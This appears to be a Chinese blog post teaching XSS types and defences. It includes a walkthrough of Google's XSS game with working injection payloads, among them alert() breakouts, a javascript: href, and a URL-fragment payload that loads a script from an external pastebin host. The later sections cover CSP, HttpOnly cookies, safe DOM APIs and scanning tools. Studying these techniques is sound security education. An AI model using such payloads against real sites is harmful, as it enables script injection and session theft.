---
title: XXS
date: 2023-05-05 23:32:24
tags: 前端，xxs，跨站脚本攻击
categories: 前端
---

XSS (Cross-site scripting)，即跨站脚本攻击，应该是前端同学都应该听过的网络安全相关的名词。它是一种尝试注入恶意脚本代码到网站上的攻击形式。它可以使得恶意使用者的代码在受影响用户的浏览器端执行，并对用户的影响。原本简称 css，为了与前端的级联样式表(cascader style sheet)区分，改称 xss。

## XSS 类型

XSS 大致可以分为 3 个类型

反射型 （Reflected XSS Attacks） 此种类型的跨站代码存在于 URL 中，所以黑客通常需要通过诱骗或加密变形等方式，将存在恶意代码的链接发给用户，只有用户点击以后才能使得攻击成功实施。

存储型（Stored XSS Attacks） 存储型 XSS 脚本攻击是指 Web 应用程序会将用户输入的数据信息保存在服务端的数据库或其他文件形式中，网页进行数据查询展示时，会从数据库中获取数据内容，并将数据内容在网页中进行输出展示，因此存储型 XSS 具有较强的稳定性。

DOM-based 型（DOM-based XSS Attacks） DOM-based 的跨站脚本攻击是通过修改页面 DOM 节点数据信息而形成的跨站脚本攻击。

为了更加深切的近距离体验 xss，可以登陆下https://xss-game.appspot.com/level3，这个游戏是 Google 提供的一个 XSS 的小游戏，大家可以自己在浏览器里试试看能不能闯过所有的关卡（可以通过研究 Target Code 来找到可以注入代码的地方，如果想不出来可以看看页面上的 Hints）。建议尽量不要看提示来挑战。这个游戏一共有 6 关，每个关卡利用了各种不同的技巧和方式来插入恶意代码，有些方式确实非常取巧。

level1:
通过在 query 里拼接 script 元素，而前端代码又是会展示这个 query 的，所以没有过滤的话，就直接运行脚本了，直接利用了 url 插入脚本，属于反射型

level2:
用户提交 blog 或者评论，前端会展示这些评论或者 blog，虽然 script 元素不会展示，但是像 dom 节点，如 a，img 元素还是会展示的，利用了 dom，属于 dom 型，也可以理解为存储型，和存储相关。

level3:

```javascript
function chooseTab(num) {
  // Dynamically load the appropriate image.
  var html = "Image " + parseInt(num) + "<br>";
  html += "<img src='/static/level3/cloud" + num + ".jpg' />";
  $("#tabContent").html(html);
}
```

利用了在浏览器直接输入 url 的漏洞，前端代码会用 url 里的参数作为 img 元素的属性直接拼接，由于没有对这些参数做转义，所以可能会导致恶意代码插入，由于利用了 dom 元素，属于 dom 型

level4:
服务端模板包含如下代码：
<img src="/static/loading.gif" onload="startTimer('{{ timer }}');" />
而timer是从url的参数里取的，如果这个timer包含了其他的js脚本代码，就会有问题，如下：https://xss-game.appspot.com/level4/frame?timer=')%3Balert(1)%3Bvar b=('

=> startTimer('');alert(1);var b=('');

level5:
前端脚本：
``` html
<br><br>
    <a href="{{ next }}">Next >></a>
</body>
```
前端直接利用url的参数拼接成了a元素的href属性：
https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)

level6:
服务端代码如下：

```js
function setInnerText(element, value) {
  if (element.innerText) {
    element.innerText = value;
  } else {
    element.textContent = value;
  }
}

function includeGadget(url) {
  var scriptEl = document.createElement("script");

  // This will totally prevent us from loading evil URLs!
  if (url.match(/^https?:\/\//)) {
    setInnerText(
      document.getElementById("log"),
      'Sorry, cannot load a URL containing "http".'
    );
    return;
  }

  // Load this awesome gadget
  scriptEl.src = url;

  // Show log messages
  scriptEl.onload = function () {
    setInnerText(document.getElementById("log"), "Loaded gadget from " + url);
  };
  scriptEl.onerror = function () {
    setInnerText(
      document.getElementById("log"),
      "Couldn't load gadget from " + url
    );
  };

  document.head.appendChild(scriptEl);
}

// Take the value after # and use it as the gadget filename.
function getGadgetName() {
  return window.location.hash.substr(1) || "/static/gadget.js";
}

includeGadget(getGadgetName());
```
这里本来想直接插入script元素的，但是行不通，只有通过script的src外链加载外域脚本：htTps://pastebin.com/raw.php?i=15S5qZs0
https://xss-game.appspot.com/level6/frame#htTps://pastebin.com/raw.php?i=15S5qZs0

## 更进一步地实验

因为现在大部分的前后端框架都会有 XSS 相关的安全策略，且默认是开启的，平时想要测试一下 XSS 的漏洞可能还比较麻烦。针对这种情况，可以使用 Damn Vulnerable Web Application （https://github.com/digininja/DVWA），它是一个主动关闭了各种安全策略的 Web 应用，包括了各种各样漏洞，当然也包括 XSS 的部分，可以用来测试自己对这些漏洞的掌握。

防范手段
防御 XSS 一大原则就是不要信任用户输入的内容！所有用户输入的内容都可以默认为不可控的、不安全的，包括但不限于 表单输入/URL 等可以由用户任意输入的来源。在回显用户的输入时候一定要做 XSS 的过滤和相应的编码。

## 浏览器内置的安全机制

开启 X-XSS-Protection：针对反射型 XSS 的一种浏览器防御机制，现在大部分现代浏览器已经废弃了这个属性。

内容安全策略 CSP：CSP 通过指定有效域——即浏览器认可的可执行脚本的有效来源——使服务器管理者有能力减少或消除 XSS 攻击所依赖的载体。一个 CSP 兼容的浏览器将会仅执行从白名单域获取到的脚本文件，忽略所有的其他脚本 (包括内联脚本和 HTML 的事件处理属性) 浏览器的同源策略。

Cookie 安全：设置 Cookie 的 HttpOnly 属性，能够最大限度的保证你的 Cookie 不会被脚本所读取并发送到其他服务器上。

## 使用成熟的框架安全机制

对于前端来说，使用常用的库，React/Vue/Angular 等流行框架来渲染数据基本上都不会有太大的问题。需要注意的是，必须非常非常非常慎重使用类似 React 的 dangerouslySetInnerHTML 或者 Vue 的 v-html 这类绕过 XSS 过滤能力的属性。

不少后端服务的框架也都在设计时就考虑了 XSS 的安全问题，如 Ruby on Rails。当然这类防御措施还是有其局限性的，并不是能一劳永逸的解决所有攻击威胁的。

## 在没有框架安全机制保证下需要避免的操作

对于前端来说，主要需要针对处理的是 DOM-based 的 XSS 威胁。

在使用 Vanilla JavaScript 需要避免那些能够直接修改 HTML 的操作，如 innerHTML/outerHTML 属性或者 document.write 之类的方法。当需要展示文本的时候，选择如 textContent/innerText 之类安全的方法。当需要创建 HTML 标签的时候，选择 createElement/appendChild 之类的方法。

还有就是更加危险的 eval 方法，虽然一般不会使用，但是需要避免一些隐式的 eval 使用，比如 setTimeout/setInterval 就可以通过 setTimeout(codeAsString, delay) 的形式执行任意字符串代码。

除此之外还有 HTML 标签上的一些事件属性等等。

如果无可避免的要使用类似方法，一定在渲染前做好过滤和编码工作。

## 更加细致的防范 CheatSheet

开放式 Web 应用程序安全项目 （ OWASP）提供了针对 XSS 防御的详尽 CheatSheet，感兴趣的同学可以作为参考。

https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.htm

https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html

## 安全检测

一些工具可以扫描网站存在的 XSS 漏洞，可以方便查缺补漏

https://github.com/s0md3v/XSStrike

https://www.zaproxy.org/

## 最后的最后

需要注意，以上这些防御措施不能详尽描述每个细节和抵御所有 XSS 攻击方式。针对 XSS 的攻防战没有一劳永逸的银弹，也没有傻瓜式的解决方案。只有严格遵照安全最佳实践来尽量避免，并提升安全防范的意识，加强安全审计的工作。

钓鱼攻击：
主要是发生在提交的 HTMl 内容的时候带有一些其他的域名地址，这些域名地址存在钓鱼的风险。
防范方式
通过 securitykit.surl 方法进行校验，该方法对非白名单的地址进行剔除。


XSS 防御方案最好是在编译时合运行时提供相关的预防方案：编译时预防开发人员出现存在安全漏洞的代码；运行时尽量不相信用户的任何输入

- 运行时：提供运行时过滤 API，能够过滤不在白名单上的标签以及常见的伪协议字符串。
- 编译时：提供 Babel 插件进行 AST 风险点识别，在风险点中包裹运行时过滤 API，起到自动防御的能力。


## 参考文章：
https://blog.dornea.nu/2014/06/02/googles-xss-game-solutions/